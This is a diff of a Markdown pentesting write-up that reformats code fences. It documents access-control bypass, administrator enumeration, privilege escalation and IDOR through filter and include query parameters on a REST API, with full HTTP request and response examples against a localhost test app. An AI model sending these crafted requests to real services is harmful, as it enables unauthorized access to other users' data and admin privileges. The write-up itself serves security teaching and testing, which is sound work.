@@ -302,8 +302,10 @@ Sec-Fetch-Dest: empty
 Sec-Fetch-Mode: cors
 Sec-Fetch-Site: same-site
 ```
+
 ### Response
-```
+
+```http
 HTTP/1.1 403 
 Date: Sat, 22 Mar 2025 14:40:07 GMT
 Content-Length: 0
@@ -316,8 +318,10 @@ Access-Control-Allow-Origin: *
 
 Again we make use of the filters and special operators that will allow us an alternative way to obtain the information of the users and evading the access control.
 For example, filter by those *users* that contain the letter “*a*” in their user *ID*:
+
 ### Request
-```
+
+```http
 GET /api/users?filter[users]=id=in=(*a*) HTTP/1.1
 Host: localhost:3000
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
@@ -333,8 +337,10 @@ Sec-Fetch-Dest: empty
 Sec-Fetch-Mode: cors
 Sec-Fetch-Site: same-site
 ```
+
 ### Response
-```
+
+```http
 HTTP/1.1 200 
 Date: Sat, 22 Mar 2025 14:43:28 GMT
 Content-Type: application/vnd.api+json;charset=UTF-8
@@ -392,8 +398,10 @@ Access-Control-Allow-Origin: *
 
 ## Privilege Escalation
 It is very likely to find certain endpoints that check user privileges through their role. For example, we are dealing with a user who has no privileges:
+
 ### Request
-```
+
+```http
 GET /api/companyUsers?include=role HTTP/1.1
 Host: localhost:3000
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
@@ -409,8 +417,10 @@ Sec-Fetch-Dest: empty
 Sec-Fetch-Mode: cors
 Sec-Fetch-Site: same-site
 ```
+
 ### Response
-```
+
+```http
 HTTP/1.1 200 
 Date: Sat, 22 Mar 2025 19:13:08 GMT
 Content-Type: application/vnd.api+json;charset=UTF-8
@@ -427,8 +437,10 @@ Access-Control-Allow-Origin: *
 ```
 
 Using certain operators we could enumerate administrator users:
+
 ### Request
-```
+
+```http
 GET /api/companyUsers?include=role&filter[companyUsers]=user.id=='94****************************' HTTP/1.1
 Host: localhost:3000
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
@@ -444,8 +456,10 @@ Sec-Fetch-Dest: empty
 Sec-Fetch-Mode: cors
 Sec-Fetch-Site: same-site
 ```
+
 ### Response
-```
+
+```http
 HTTP/1.1 200 
 Date: Sat, 22 Mar 2025 19:13:45 GMT
 Content-Type: application/vnd.api+json;charset=UTF-8
@@ -476,8 +490,10 @@ Access-Control-Allow-Origin: *
 ```
 
 After knowing an identifier of an administrator user, it would be possible to exploit a privilege escalation by replacing or adding the corresponding filter with the administrator's identifier and getting the same privileges:
+
 ### Request
-```
+
+```http
 GET /api/functionalities/allPermissionsFunctionalities?filter[companyUsers]=user.id=='94****************************' HTTP/1.1
 Host: localhost:3000
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
@@ -493,8 +509,10 @@ Sec-Fetch-Dest: empty
 Sec-Fetch-Mode: cors
 Sec-Fetch-Site: same-site
 ```
+
 ### Response
-```
+
+```http
 HTTP/1.1 200 
 Date: Sat, 22 Mar 2025 18:53:00 GMT
 Content-Type: application/vnd.api+json;charset=UTF-8
@@ -540,11 +558,14 @@ Access-Control-Allow-Origin: *
 ```
 
 ## Impersonate or Insecure Direct Object References (IDOR)
+
 In addition to the use of the `filter` parameter, it is possible to use other parameters such as `include` which allows to include in the result certain parameters (e.g. language, country, password...).
 
 In the following example, the information of our user profile is shown:
+
 ### Request
-```
+
+```http
 GET /api/users?include=language,country HTTP/1.1
 Host: localhost:3000
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
@@ -560,8 +581,10 @@ Sec-Fetch-Dest: empty
 Sec-Fetch-Mode: cors
 Sec-Fetch-Site: same-site
 ```
+
 ### Response
-```
+
+```http
 HTTP/1.1 200 
 Date: Sat, 22 Mar 2025 19:47:27 GMT
 Content-Type: application/vnd.api+json;charset=UTF-8
@@ -598,8 +621,10 @@ Access-Control-Allow-Origin: *
 ```
 
 The combination of filters can be used to evade authorization control and gain access to other users' profiles:
+
 ### Request
-```
+
+```http
 GET /api/users?include=language,country&filter[users]=id=='94***************' HTTP/1.1
 Host: localhost:3000
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
